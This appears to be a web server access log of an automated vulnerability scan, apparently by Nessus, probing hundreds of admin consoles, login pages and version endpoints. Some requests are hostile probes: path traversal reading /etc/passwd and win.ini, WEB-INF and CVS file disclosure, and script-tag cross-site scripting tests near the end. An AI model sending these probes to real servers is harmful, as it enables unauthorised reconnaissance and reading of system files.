[2026-06-22T16:51:22.372Z] GET /admin
[2026-06-22T16:51:22.492Z] GET /admin
[2026-06-22T16:51:22.660Z] GET /owncloud/index.php/login
[2026-06-22T16:51:22.747Z] GET /login.htm
[2026-06-22T16:51:22.810Z] GET /exchweb/bin/auth/owalogon.asp?url=http://12345678910
[2026-06-22T16:51:22.858Z] GET /owa/auth/logon.aspx
[2026-06-22T16:51:22.861Z] GET /exchange/logon.asp
[2026-06-22T16:51:22.955Z] GET /otrs/index.pl
[2026-06-22T16:51:23.018Z] GET /ossim/session/login.php
[2026-06-22T16:51:23.067Z] GET /av/api/1.0/system/local/tasks
[2026-06-22T16:51:23.150Z] GET /geoserver/web/
[2026-06-22T16:51:23.154Z] GET /geoserver/web/?0
[2026-06-22T16:51:23.156Z] GET /geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage
[2026-06-22T16:51:23.270Z] GET /.DS_Store
[2026-06-22T16:51:23.359Z] GET /ws_utc/login.do
[2026-06-22T16:51:23.362Z] GET /wls_utc/
[2026-06-22T16:51:23.504Z] GET /cs/idcplg?IdcService=GET_ENVIRONMENT&IsJson=1
[2026-06-22T16:51:23.513Z] GET /idc/idcplg?IdcService=GET_ENVIRONMENT&IsJson=1
[2026-06-22T16:51:23.516Z] GET //idcplg?IdcService=GET_ENVIRONMENT&IsJson=1
[2026-06-22T16:51:23.663Z] GET /web-determinations/?CookieSet=true
[2026-06-22T16:51:23.736Z] GET /
[2026-06-22T16:51:23.806Z] GET /sgdadmin/faces/jsp/Version.jsp
[2026-06-22T16:51:23.877Z] GET /gateway/login
[2026-06-22T16:51:23.958Z] GET /portal/page/portal/Design_Time_PG/Welcome
[2026-06-22T16:51:23.961Z] GET /page/portal/Design_Time_PG/Welcome
[2026-06-22T16:51:24.291Z] GET /portal/pls/portal/PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.300Z] GET /portal/pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.303Z] GET /portal/pls/portal/DEV1_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.305Z] GET /portal/pls/portal/DEV2_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.307Z] GET /portal/pls/portal/DEV3_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.310Z] GET /portal/pls/portal/DEV4_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.312Z] GET /portal/pls/portal/DEV5_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.315Z] GET /portal/pls/portal/DEV6_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.317Z] GET /portal/pls/portal/DEV7_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.320Z] GET /portal/pls/portal/DEV8_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.322Z] GET /portal/pls/portal/DEV9_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.325Z] GET /pls/portal/PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.327Z] GET /pls/portal/DEV_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.329Z] GET /pls/portal/DEV1_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.332Z] GET /pls/portal/DEV2_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.334Z] GET /pls/portal/DEV3_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.337Z] GET /pls/portal/DEV4_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.339Z] GET /pls/portal/DEV5_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.342Z] GET /pls/portal/DEV6_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.345Z] GET /pls/portal/DEV7_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.349Z] GET /pls/portal/DEV8_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:24.351Z] GET /pls/portal/DEV9_PORTAL_DEMO.ORG_CHART.SHOW
[2026-06-22T16:51:25.069Z] GET /mapviewer/omserver?getv=t
[2026-06-22T16:51:25.173Z] GET /
[2026-06-22T16:51:25.240Z] GET /dndirector/dashboard/Show.dn
[2026-06-22T16:51:25.333Z] GET /dndirector
[2026-06-22T16:51:25.412Z] GET /
[2026-06-22T16:51:25.480Z] GET /btmui/
[2026-06-22T16:51:25.544Z] GET /ords/r/apex/workspace-sign-in/oracle-apex-sign-in
[2026-06-22T16:51:25.625Z] GET /ords/
[2026-06-22T16:51:25.628Z] GET /apex/listenerConfigure
[2026-06-22T16:51:25.714Z] GET /apex/f?p=nessuscheck
[2026-06-22T16:51:25.716Z] GET /pls/apex/f?p=nessuscheck
[2026-06-22T16:51:25.791Z] GET /cgi-bin/luci
[2026-06-22T16:51:25.854Z] GET /
[2026-06-22T16:51:25.979Z] GET /conductor
[2026-06-22T16:51:26.073Z] GET /login.jsp
[2026-06-22T16:51:26.129Z] GET /dwr/index.html
[2026-06-22T16:51:26.204Z] GET /login.jsp
[2026-06-22T16:51:26.260Z] GET /cgi-bin/pub/pki?cmd=serverInfo
[2026-06-22T16:51:26.319Z] GET /api/config
[2026-06-22T16:51:26.419Z] GET /
[2026-06-22T16:51:26.440Z] GET /cgi-bin/mrlg.cgi
[2026-06-22T16:51:26.443Z] GET /lg/
[2026-06-22T16:51:26.445Z] GET /mrlg/
[2026-06-22T16:51:26.566Z] GET /
[2026-06-22T16:51:26.737Z] POST /v1/users/no_such_user_999
[2026-06-22T16:51:26.813Z] GET /NoviSurvey/Login.aspx
[2026-06-22T16:51:26.815Z] GET /Login.aspx
[2026-06-22T16:51:26.897Z] GET /
[2026-06-22T16:51:27.024Z] GET /netbasic/websinfo.bas
[2026-06-22T16:51:27.032Z] GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/misc/allfield.jse
[2026-06-22T16:51:27.033Z] GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/misc/test.jse
[2026-06-22T16:51:27.035Z] GET /perl/samples/lancgi.pl
[2026-06-22T16:51:27.036Z] GET /perl/samples/ndslogin.pl
[2026-06-22T16:51:27.038Z] GET /perl/samples/volscgi.pl
[2026-06-22T16:51:27.039Z] GET /perl/samples/env.pl
[2026-06-22T16:51:27.041Z] GET /nsn/env.bas
[2026-06-22T16:51:27.042Z] GET /nsn/fdir.bas
[2026-06-22T16:51:27.319Z] GET /nsn/..%5Cutil/chkvol.bas
[2026-06-22T16:51:27.321Z] GET /nsn/..%5Cutil/dir.bas
[2026-06-22T16:51:27.322Z] GET /nsn/..%5Cutil/glist.bas
[2026-06-22T16:51:27.324Z] GET /nsn/..%5Cutil/lancard.bas
[2026-06-22T16:51:27.325Z] GET /nsn/..%5Cutil/set.bas
[2026-06-22T16:51:27.327Z] GET /nsn/..%5Cutil/userlist.bas
[2026-06-22T16:51:27.328Z] GET /nsn/..%5Cweb/env.bas
[2026-06-22T16:51:27.329Z] GET /nsn/..%5Cwebdemo/fdir.bas
[2026-06-22T16:51:27.495Z] GET /nps/servlet/portal
[2026-06-22T16:51:27.547Z] GET /gwadmin-console/login.jsp
[2026-06-22T16:51:27.599Z] GET /IDMProv/jsps/help/Help.jsp
[2026-06-22T16:51:27.698Z] GET /logout
[2026-06-22T16:51:27.772Z] GET /
[2026-06-22T16:51:27.835Z] GET /examples/jsp/source.jsp?%2e%2e/%2e%2e/%2e%2e/%2e%2e/system/autoexec.ncf
[2026-06-22T16:51:27.882Z] POST /perl/
[2026-06-22T16:51:27.934Z] GET /help/contents.htm
[2026-06-22T16:51:27.936Z] GET /manual/ag/contents.htm
[2026-06-22T16:51:28.003Z] GET /images
[2026-06-22T16:51:28.062Z] GET /baselining/version
[2026-06-22T16:51:28.127Z] GET /nps/servlet/portalservice
[2026-06-22T16:51:28.189Z] GET /index.html
[2026-06-22T16:51:28.257Z] GET /userSession.do?method=getLanguage
[2026-06-22T16:51:28.387Z] GET /
[2026-06-22T16:51:28.447Z] GET /
[2026-06-22T16:51:28.507Z] GET /
[2026-06-22T16:51:28.571Z] GET /qsoap.qap
[2026-06-22T16:51:28.642Z] GET /login.php
[2026-06-22T16:51:28.717Z] GET /nacos/
[2026-06-22T16:51:28.782Z] GET /
[2026-06-22T16:51:28.786Z] GET //Help.action
[2026-06-22T16:51:28.901Z] GET /
[2026-06-22T16:51:28.965Z] GET /
[2026-06-22T16:51:29.045Z] GET /
[2026-06-22T16:51:29.049Z] GET /
[2026-06-22T16:51:40.208Z] GET /mod_gzip_status
[2026-06-22T16:51:40.322Z] GET /esm_login.asp?loginBannerDisplayed=1
[2026-06-22T16:51:40.432Z] GET /server-manager/
[2026-06-22T16:51:40.516Z] GET /
[2026-06-22T16:51:40.593Z] GET /
[2026-06-22T16:51:40.697Z] GET /login.html
[2026-06-22T16:51:40.851Z] GET /uddipublic/default.aspx
[2026-06-22T16:51:40.860Z] GET /uddi/default.aspx
[2026-06-22T16:51:40.989Z] GET /Explorer/index.html
[2026-06-22T16:51:41.072Z] GET /
[2026-06-22T16:51:41.143Z] GET /sabin/SiteAdmin.htm
[2026-06-22T16:51:41.250Z] GET /reporter/client.jsp
[2026-06-22T16:51:41.356Z] GET /admin/
[2026-06-22T16:51:41.359Z] GET /admin/LocalIndex.html
[2026-06-22T16:51:41.361Z] GET /scmadmin/
[2026-06-22T16:51:41.363Z] GET /scmadmin/LocalIndex.html
[2026-06-22T16:51:41.566Z] GET /index.exp
[2026-06-22T16:51:41.646Z] GET /
[2026-06-22T16:51:41.708Z] GET /
[2026-06-22T16:51:41.847Z] GET /core/orionSplashScreen.do
[2026-06-22T16:51:41.932Z] GET /
[2026-06-22T16:51:42.000Z] GET /login.html
[2026-06-22T16:51:42.071Z] GET /
[2026-06-22T16:51:42.162Z] GET /mantis/login_page.php
[2026-06-22T16:51:42.166Z] GET /mantisbt/login_page.php
[2026-06-22T16:51:42.259Z] POST /servlet/GetProductVersion
[2026-06-22T16:51:42.360Z] GET /PassTrixMain.cc
[2026-06-22T16:51:42.443Z] GET /LoginPage.do
[2026-06-22T16:51:42.446Z] GET /LoginPage.do
[2026-06-22T16:51:42.554Z] GET /netflow/html/aboutus.jsp
[2026-06-22T16:51:42.620Z] GET /LoginPage.do
[2026-06-22T16:51:43.074Z] POST /servlet/GetProductVersion
[2026-06-22T16:51:43.164Z] GET /login.do
[2026-06-22T16:51:43.167Z] GET /help/introduction/release-notes.html
[2026-06-22T16:51:43.304Z] POST /servlet/GetProductVersion
[2026-06-22T16:51:43.307Z] GET /event/index.do
[2026-06-22T16:51:43.401Z] GET /configurations.do
[2026-06-22T16:51:43.495Z] GET /NCMContainer.cc
[2026-06-22T16:51:43.624Z] GET /index.do
[2026-06-22T16:51:43.700Z] POST /servlet/GetProductVersion
[2026-06-22T16:51:43.798Z] POST /servlet/GetProductVersion
[2026-06-22T16:51:43.861Z] POST /servlet/GetProductVersion
[2026-06-22T16:51:43.929Z] GET /
[2026-06-22T16:51:44.087Z] GET /smconf.nsf
[2026-06-22T16:51:44.095Z] GET /smadmr5.nsf
[2026-06-22T16:51:44.097Z] GET /smency.nsf
[2026-06-22T16:51:44.117Z] GET /smftypes.nsf
[2026-06-22T16:51:44.119Z] GET /smsmvlog.nsf
[2026-06-22T16:51:44.121Z] GET /smhelp.nsf
[2026-06-22T16:51:44.123Z] GET /smmsg.nsf
[2026-06-22T16:51:44.125Z] GET /smtime.nsf
[2026-06-22T16:51:44.127Z] GET /smquar.nsf
[2026-06-22T16:51:44.445Z] GET /stcenter.nsf
[2026-06-22T16:51:44.448Z] GET /Sametime/buildinfo.txt
[2026-06-22T16:51:44.450Z] GET /Sametime/domino/html/sametime/buildinfoST75CF1.txt
[2026-06-22T16:51:44.572Z] GET /
[2026-06-22T16:51:48.136Z] GET /login/index.php
[2026-06-22T16:51:48.209Z] GET /HNAP1/
[2026-06-22T16:51:48.309Z] GET /
[2026-06-22T16:51:48.387Z] GET /mve/help/en/inventory/am_about.html
[2026-06-22T16:51:48.472Z] GET /api/v1/version
[2026-06-22T16:51:48.554Z] POST /jsonrpc
[2026-06-22T16:51:48.634Z] POST /server/service/smsConfigServiceHttpInvoker
[2026-06-22T16:51:48.730Z] GET /api/v1.0/environment
[2026-06-22T16:51:48.733Z] GET /vsapres/web20/core/login.aspx
[2026-06-22T16:51:48.874Z] GET /login
[2026-06-22T16:51:48.883Z] GET /device
[2026-06-22T16:51:49.035Z] GET /mainui/
[2026-06-22T16:51:49.124Z] GET /assets/js/conf/global_config.js
[2026-06-22T16:51:49.213Z] GET /
[2026-06-22T16:51:49.279Z] GET /./WEB-INF/
[2026-06-22T16:51:49.413Z] GET /invoker/EJBInvokerServlet
[2026-06-22T16:51:49.422Z] GET /invoker/JMXInvokerServlet
[2026-06-22T16:51:49.478Z] GET /login.html
[2026-06-22T16:51:49.622Z] GET /web-console/ServerInfo.jsp
[2026-06-22T16:51:49.625Z] GET /web-console/ServerInfo.jsp%00
[2026-06-22T16:51:49.753Z] GET /
[2026-06-22T16:51:49.853Z] GET /NASApp/nessus/
[2026-06-22T16:51:49.913Z] GET /NASApp/nessus/
[2026-06-22T16:51:49.980Z] GET /home.seam
[2026-06-22T16:51:50.050Z] GET /interscan/cgi-bin/FtpSave.dll?I'm%20Here
[2026-06-22T16:51:50.168Z] GET /status.php3
[2026-06-22T16:51:50.181Z] GET /imp/status.php3
[2026-06-22T16:51:50.200Z] GET /horde/imp/status.php3
[2026-06-22T16:51:50.341Z] GET /iisprotect/admin/SiteAdmin.ASP?V_SiteName=&V_FirstTab=Groups&V_SecondTab=All&GroupName=nessus
[2026-06-22T16:51:50.350Z] GET /iisprotect/admin/SiteAdmin.ASP?V_SiteName=&V_FirstTab=Groups&V_SecondTab=All&GroupName=nessus'
[2026-06-22T16:51:50.449Z] GET /iisprotect/admin/GlobalAdmin.asp?V_FirstTab=GlobalSetting
[2026-06-22T16:51:50.513Z] GET /iissamples/issamples/fastq.idq
[2026-06-22T16:51:50.530Z] GET /iissamples/issamples/query.idq
[2026-06-22T16:51:50.533Z] GET /iissamples/exair/search/search.idq
[2026-06-22T16:51:50.536Z] GET /iissamples/exair/search/query.idq
[2026-06-22T16:51:50.538Z] GET /iissamples/issamples/oop/qsumrhit.htw?CiWebHitsFile=/iissamples/issamples/oop/qsumrhit.htw&CiRestriction=none&CiHiliteType=Full
[2026-06-22T16:51:50.540Z] GET /iissamples/issamples/oop/qfullhit.htw?CiWebHitsFile=/iissamples/issamples/oop/qfullhit.htw&CiRestriction=none&CiHiliteType=Full
[2026-06-22T16:51:50.543Z] GET /scripts/samples/search/author.idq
[2026-06-22T16:51:50.562Z] GET /scripts/samples/search/filesize.idq
[2026-06-22T16:51:50.565Z] GET /scripts/samples/search/filetime.idq
[2026-06-22T16:51:50.567Z] GET /scripts/samples/search/queryhit.idq
[2026-06-22T16:51:50.569Z] GET /scripts/samples/search/simple.idq
[2026-06-22T16:51:50.571Z] GET /iissamples/exair/howitworks/codebrws.asp
[2026-06-22T16:51:50.573Z] GET /iissamples/issamples/query.asp
[2026-06-22T16:51:50.971Z] GET /
[2026-06-22T16:51:50.980Z] GET //NyFrfRvi.asp
[2026-06-22T16:51:51.150Z] GET /NULL.ida
[2026-06-22T16:51:51.527Z] GET /niet1570045714
[2026-06-22T16:51:51.540Z] GET /niet1285472128.
[2026-06-22T16:51:51.545Z] GET /niet442334492.asp
[2026-06-22T16:51:51.551Z] GET /niet2129828946.aspx
[2026-06-22T16:51:51.556Z] GET /niet69231586.html
[2026-06-22T16:51:51.561Z] GET /niet1658449060.htm
[2026-06-22T16:51:51.567Z] GET /niet1785026092.shtm
[2026-06-22T16:51:51.573Z] GET /niet183706798.shtml
[2026-06-22T16:51:51.579Z] GET /niet69248693.jsp
[2026-06-22T16:51:51.585Z] GET /niet1032932676.jspx
[2026-06-22T16:51:51.590Z] GET /niet977833438.php
[2026-06-22T16:51:51.596Z] GET /niet1120808957.php3
[2026-06-22T16:51:51.601Z] GET /niet869810977.php4
[2026-06-22T16:51:51.608Z] GET /niet476972371.php5
[2026-06-22T16:51:51.613Z] GET /niet21558923.php6
[2026-06-22T16:51:51.620Z] GET /niet384859488.cfm
[2026-06-22T16:51:52.978Z] GET /cgi-bin/com5.pl
[2026-06-22T16:51:53.063Z] GET /iissamples/sdk/asp/docs/codebrws.asp
[2026-06-22T16:51:53.210Z] GET /iisadmpwd/aexp.htr
[2026-06-22T16:51:53.212Z] GET /iisadmpwd/aexp2.htr
[2026-06-22T16:51:53.214Z] GET /iisadmpwd/aexp2b.htr
[2026-06-22T16:51:53.217Z] GET /iisadmpwd/aexp3.htr
[2026-06-22T16:51:53.219Z] GET /iisadmpwd/aexp4.htr
[2026-06-22T16:51:53.221Z] GET /iisadmpwd/aexp4b.htr
[2026-06-22T16:51:53.442Z] GET /igsponsor
[2026-06-22T16:51:53.523Z] GET /query.idq?CiTemplate=../../../../../winnt/win.ini
[2026-06-22T16:51:53.528Z] GET /query.idq?CiTemplate=../../../../../winnt/win.ini%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
[2026-06-22T16:51:53.647Z] GET /mail/
[2026-06-22T16:51:53.739Z] GET /login
[2026-06-22T16:51:53.811Z] GET /builtin/index.html
[2026-06-22T16:51:53.957Z] GET //
[2026-06-22T16:51:53.960Z] GET /tsp//
[2026-06-22T16:51:53.963Z] GET /ap//
[2026-06-22T16:51:53.965Z] GET /ssp//
[2026-06-22T16:51:54.109Z] GET /login
[2026-06-22T16:51:54.344Z] GET /rcladmin/js/art_i18n/nls/art_i18n.js
[2026-06-22T16:51:54.436Z] GET /rdweb/login/login.html
[2026-06-22T16:51:54.519Z] GET /ibmmq/console/login.html
[2026-06-22T16:51:54.522Z] GET /ibmmq/console/nls/en/strings.json
[2026-06-22T16:51:54.625Z] GET /jts/
[2026-06-22T16:51:54.716Z] GET /dp/login.xml
[2026-06-22T16:51:54.797Z] GET /albatross/A3Suite
[2026-06-22T16:51:54.879Z] GET /
[2026-06-22T16:51:54.945Z] GET /shared/userlogin.php
[2026-06-22T16:51:55.014Z] GET /trc
[2026-06-22T16:51:55.091Z] GET /aspera/faspex/login/new?local=true
[2026-06-22T16:51:55.186Z] GET /
[2026-06-22T16:51:55.268Z] GET /~nobody/etc/passwd
[2026-06-22T16:51:55.364Z] GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[2026-06-22T16:51:55.450Z] GET /remotesupport/rest/productinfo
[2026-06-22T16:51:55.530Z] GET //
[2026-06-22T16:51:55.646Z] GET /
[2026-06-22T16:51:55.774Z] GET /js/hpsum/hpsum-version.js
[2026-06-22T16:51:55.782Z] GET /js/hpsum/hpsum-version.js
[2026-06-22T16:51:55.784Z] GET /js/hpsum/hpsum-version.js
[2026-06-22T16:51:55.787Z] GET /js/hpsum/hpsum-version.js
[2026-06-22T16:51:55.789Z] GET /js/hpsum/hpsum-version.js
[2026-06-22T16:51:55.977Z] GET /SiteScope/
[2026-06-22T16:51:56.050Z] GET /oo/
[2026-06-22T16:51:56.145Z] GET /xmldata?item=all
[2026-06-22T16:51:56.241Z] GET /nnm/main
[2026-06-22T16:51:56.314Z] GET /imc
[2026-06-22T16:51:56.393Z] GET /autopass/login_input
[2026-06-22T16:51:56.476Z] GET /hazelcast/rest/cluster
[2026-06-22T16:51:56.575Z] GET /public/
[2026-06-22T16:51:56.699Z] GET /com/novell/webaccess/WebAccessUninstall.ini
[2026-06-22T16:51:56.758Z] GET /portal
[2026-06-22T16:51:56.850Z] GET /servlet/webacc?error=webacc
[2026-06-22T16:51:56.933Z] GET /login
[2026-06-22T16:51:57.049Z] GET /login
[2026-06-22T16:51:57.194Z] GET /about/
[2026-06-22T16:51:57.404Z] GET /
[2026-06-22T16:51:57.462Z] GET /users/sign_in
[2026-06-22T16:51:57.549Z] GET /portal/loginpage.aspx
[2026-06-22T16:51:57.657Z] GET /portal/loginpage.aspx
[2026-06-22T16:51:57.736Z] GET /setup
[2026-06-22T16:51:57.807Z] GET /
[2026-06-22T16:51:57.869Z] GET /archiverspaapi/api/product
[2026-06-22T16:51:57.949Z] GET /WEB-INF./web.xml
[2026-06-22T16:51:58.025Z] GET /ews/index.htm
[2026-06-22T16:51:58.098Z] GET /_vti_bin/shtml.dll/_vti_rpc
[2026-06-22T16:51:58.187Z] GET /_vti_bin/fpcount.exe
[2026-06-22T16:51:58.249Z] GET /goanywhere/auth/Login.xhtml
[2026-06-22T16:51:58.317Z] GET /workflow/servlet/ftpservlet
[2026-06-22T16:51:58.579Z] GET /gui/i18n/messages.en.json
[2026-06-22T16:51:58.710Z] GET /system/console?version=1.5
[2026-06-22T16:51:58.713Z] GET /images/login_top.gif
[2026-06-22T16:51:58.716Z] GET /images/logon_merge.gif
[2026-06-22T16:51:58.719Z] GET /login
[2026-06-22T16:51:58.722Z] GET /431cb5237001e73e794398e4fa3cf660/css/main-green.css
[2026-06-22T16:51:58.725Z] GET /robots.txt
[2026-06-22T16:51:59.039Z] GET /f360/login.jsp
[2026-06-22T16:51:59.048Z] GET //login.jsp
[2026-06-22T16:51:59.141Z] GET /login/
[2026-06-22T16:51:59.223Z] GET /
[2026-06-22T16:51:59.387Z] GET /features
[2026-06-22T16:51:59.459Z] GET /default.php
[2026-06-22T16:51:59.476Z] GET /fogbugz/default.php
[2026-06-22T16:51:59.597Z] GET /
[2026-06-22T16:51:59.683Z] GET //login/login
[2026-06-22T16:51:59.754Z] GET /fpui/jsp/login.jsp
[2026-06-22T16:51:59.831Z] GET /acopia/
[2026-06-22T16:51:59.900Z] GET /ui/login/
[2026-06-22T16:51:59.985Z] GET /eonapi/getAuthenticationStatus
[2026-06-22T16:52:00.201Z] GET /login.web
[2026-06-22T16:52:00.283Z] GET /?
[2026-06-22T16:52:00.351Z] POST /spipe?Source=nessus
[2026-06-22T16:52:00.452Z] GET /PUBLIC/ADMIN/INDEX.HTM
[2026-06-22T16:52:00.600Z] GET /SE/appInfo.xml
[2026-06-22T16:52:00.608Z] GET /SE/EMC_SE.swf
[2026-06-22T16:52:00.610Z] GET /SE/EMC_SE.swf
[2026-06-22T16:52:00.793Z] GET /RSAarcher/Default.aspx
[2026-06-22T16:52:00.796Z] GET /RSAarcher/Default.asp
[2026-06-22T16:52:01.040Z] GET /dtlt/home.html
[2026-06-22T16:52:01.123Z] GET /IPCamDesc.xml
[2026-06-22T16:52:01.211Z] GET /desktop/
[2026-06-22T16:52:01.272Z] GET /
[2026-06-22T16:52:01.276Z] GET /update.php?op=info
[2026-06-22T16:52:01.279Z] GET /misc/drupal.js
[2026-06-22T16:52:01.281Z] GET /core/misc/drupal.js
[2026-06-22T16:52:01.284Z] GET /drupal/
[2026-06-22T16:52:01.287Z] GET /drupal/update.php?op=info
[2026-06-22T16:52:01.291Z] GET /drupal/misc/drupal.js
[2026-06-22T16:52:01.294Z] GET /drupal/core/misc/drupal.js
[2026-06-22T16:52:01.587Z] GET /web/
[2026-06-22T16:52:01.661Z] POST /cgi-bin/mainfunction.cgi
[2026-06-22T16:52:01.802Z] GET /NDfZBmsd.ashx
[2026-06-22T16:52:01.811Z] GET /w4_R_u3l.aspx
[2026-06-22T16:52:01.813Z] GET /VPrKHqhk.asmx
[2026-06-22T16:52:01.815Z] GET /jS53ypFm.rem
[2026-06-22T16:52:01.818Z] GET /jL2kfCyp.soap
[2026-06-22T16:52:02.104Z] GET /
[2026-06-22T16:52:07.123Z] GET /
[2026-06-22T16:52:07.247Z] GET /UHt8v7N2.aspx
[2026-06-22T16:52:07.344Z] GET /u2DzV6gf.ashx
[2026-06-22T16:52:07.347Z] GET /kMRvg3Gj.aspx
[2026-06-22T16:52:07.349Z] GET /0IDua5eH.asmx
[2026-06-22T16:52:07.506Z] GET /user/login
[2026-06-22T16:52:07.601Z] GET /probe/probeInfo
[2026-06-22T16:52:07.695Z] GET /syslog.htm
[2026-06-22T16:52:07.769Z] GET /js/webcfg.js
[2026-06-22T16:52:07.840Z] GET /devinfo.xml
[2026-06-22T16:52:07.948Z] GET /
[2026-06-22T16:52:07.950Z] GET /api
[2026-06-22T16:52:08.108Z] GET /
[2026-06-22T16:52:08.201Z] POST /storageevent/CompellentStorageEventServices
[2026-06-22T16:52:08.291Z] GET /servlet/UDataArea?plugin=com.dell.oma.webplugins.AboutWebPlugin
[2026-06-22T16:52:08.294Z] GET /UDataArea?plugin=com.dell.oma.webplugins.AboutWebPlugin
[2026-06-22T16:52:08.410Z] GET /common/about.php
[2026-06-22T16:52:08.479Z] GET /about
[2026-06-22T16:52:08.566Z] GET /ddem/rest/auth/info
[2026-06-22T16:52:08.681Z] GET /
[2026-06-22T16:52:08.683Z] GET /devinfo?area=notice|net|version
[2026-06-22T16:52:08.685Z] GET /ayefeaturesconvert.js
[2026-06-22T16:52:08.837Z] GET /Loginhandler/Login
[2026-06-22T16:52:08.938Z] GET /management/login
[2026-06-22T16:52:09.018Z] GET /
[2026-06-22T16:52:09.083Z] GET /
[2026-06-22T16:52:09.190Z] GET /CVS/Entries
[2026-06-22T16:52:09.289Z] GET /
[2026-06-22T16:52:09.292Z] GET /rest-service/reviews-v1/versionInfo
[2026-06-22T16:52:09.388Z] GET /index.html?urlmaskfilter=<script>foo</script>
[2026-06-22T16:52:09.460Z] GET /<script>foo</script>
[2026-06-22T16:52:09.525Z] GET /servlet/webacc?User.lang=<script>foo</script>
[2026-06-22T16:52:09.590Z] GET /popuplargeimage.asp?strImageTag=<script>foo</script>
[2026-06-22T16:52:09.660Z] GET /crossdomain.xml
[2026-06-22T16:52:09.750Z] POST /api/login/
[2026-06-22T16:52:10.463Z] GET /rio2t8nr.asp?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.472Z] GET /rio2t8nr.asp?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.475Z] GET /rio2t8nr.aspx?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.477Z] GET /rio2t8nr.aspx?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.480Z] GET /rio2t8nr.pl?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.482Z] GET /rio2t8nr.pl?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.483Z] GET /rio2t8nr.cgi?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.485Z] GET /rio2t8nr.cgi?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.487Z] GET /rio2t8nr.exe?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.489Z] GET /rio2t8nr.exe?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.491Z] GET /rio2t8nr.cfm?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.493Z] GET /rio2t8nr.cfm?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.495Z] GET /rio2t8nr.html?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.498Z] GET /rio2t8nr.html?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.500Z] GET /rio2t8nr.jsp?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.501Z] GET /rio2t8nr.jsp?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.504Z] GET /rio2t8nr.php?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.507Z] GET /rio2t8nr.php?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.509Z] GET /rio2t8nr.php3?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.512Z] GET /rio2t8nr.php3?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.514Z] GET /rio2t8nr.cfc?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.516Z] GET /rio2t8nr.cfc?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.518Z] GET /rio2t8nr.nsf?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.521Z] GET /rio2t8nr.nsf?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.523Z] GET /rio2t8nr.dll?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.525Z] GET /rio2t8nr.dll?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
[2026-06-22T16:52:10.527Z] GET /rio2t8nr.fts?<script>document.cookie=%22testuspr=4796;%22</script>
[2026-06-22T16:52:10.529Z] GET /rio2t8nr.fts?<meta%20http-equiv=Set-Cookie%20content=%22testuspr=4796%22>
